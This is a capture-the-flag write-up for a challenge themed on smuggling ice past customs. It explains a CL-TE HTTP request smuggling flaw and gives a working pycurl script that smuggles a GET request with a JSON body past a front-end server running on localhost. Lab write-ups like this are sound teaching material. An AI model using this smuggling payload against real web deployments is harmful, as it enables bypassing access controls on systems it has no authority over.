# SMUGGLER

## Prompt

```
Hey kid, this next job's a little tricky. 

'Case ya didn't figure, some fanatics have been going around blasting water out of the galaxy.
Yeah, water. And little guys like you 'n me are the ones feeling it. Big embargo on water—its like gold now.

Client is on the space station, doin the 'hide 'n plain sight' trick. I got you an old cargo ship to look the part, complete with the management system.

Hard part's getting the ice past customs. 

Just a little hint from your favorite handler: 
Do this in one go.
```

## Vulnerability

This application suffers from a CL-TE type smuggle vulnerability.

The 'front-end' server prioritizes and parses data by the 'Content-Length' header.
The 'back-end' server prioritizes and parses data by the 'Transfer-Encoding' header.

Protocol allows both of these headers to exist in the same request, even though these headers contradict. As a result, the front-end and back-end ignore the header they do not prioritize.
If the back-end server is the one executing requests, our goal should be to craft a request that passes both server's checks and gives the back-end a normally illegal request. 

## Solution

First, consider that we need to find a target. The site has multiple pages selectable from the left menu.
1. 'About' and 'Laws & Regs' contain some text, but nothing manipulatable.
2. 'flag.txt' is a prank button. 
3. 'Inventory' presents a list of items selectable with a checkbox.
4. 'Inspection Request' lists our selected items from 'Inventory' along with a 'Submit' button

Inspecting the request made by the submit button shows that it POSTs to /customsinspection. As the theme and prompt of the challenge hints about the customs inspection, and that this page is the only one allowing POST requets to customs, this is likely our target. Attempting to make a GET request from this page will response with an 'invalid method' response, further indicating there is something hidden.

Lets begin to form a potential attack:

First, lets define the url.
```
response = BytesIO()

url = "http://127.0.0.1:5000/customsinspection"                              # Target endpoint, doesn't allow GET but allows POST
```

There are a few types of smuggle requests, but the most basic is CL-TE. Let's set the headers for both:

```
headers = [f'Content-Length: {len(payload)}', 'Transfer-Encoding: chunked']  # Set both headers   
```

Now the payload requires a 0 at the beginning such that the back-end sees it and assumes the first chunk (the POST) has ended.
Thus whenever it sees data after, it assumes it is a new and valid request. Then, have it follow an invalid request.

```
payload = """
0
GET /customsinspection HTTP/1.1
"""
```

One more thing to consider is that our prompt told us to smuggle the ice through. If we observe the POST request, we can see that the array of selected items is structured like so:
```
payload = """
0
GET /customsinspection HTTP/1.1

[
   "Ice Blocks"
]
"""
```

Now, use a scripting tool to bundle everything up and send it.

```
req = pycurl.Curl()
req.setopt(req.URL, url)                # Target URL
req.setopt(req.POST, 1)                 # Enable POST
req.setopt(req.HTTPHEADER, headers)     # Load custom headers
req.setopt(req.POSTFIELDS, payload)     # Add data
req.setopt(req.WRITEDATA, response)     # Save data to variable
req.perform()
```

Using tools like Burp Suite will likely either be a pain or unusuable, as these tools will see the 'Transfer-Encoding: chunked' and format the requests into chunks before sending the data! This breaks the attack as it requires everything to be 'sent in one go', as the prompt lightly hints toward.

Sending the request and reading the response will yield the flag.

## Script

```
import requests 
import pycurl
import webbrowser
from io import BytesIO

response = BytesIO()

payload = """
0
GET /customsinspection HTTP/1.1

[
   "Ice Blocks"
]
"""

url = "http://127.0.0.1:5000/customsinspection"                              # Target endpoint, doesn't allow GET but allows POST
headers = [f'Content-Length: {len(payload)}', 'Transfer-Encoding: chunked']  # Set both headers   

req = pycurl.Curl()
req.setopt(req.URL, url)                # Target URL
req.setopt(req.POST, 1)                 # Enable POST
req.setopt(req.HTTPHEADER, headers)     # Load custom headers
req.setopt(req.POSTFIELDS, payload)     # Add data
req.setopt(req.WRITEDATA, response)     # Save data to variable
req.perform()

# Save the response data to a file
with open('response.html', 'wb') as f:
    f.write(response.getvalue())

# Open html to web browser
webbrowser.open('response.html')
```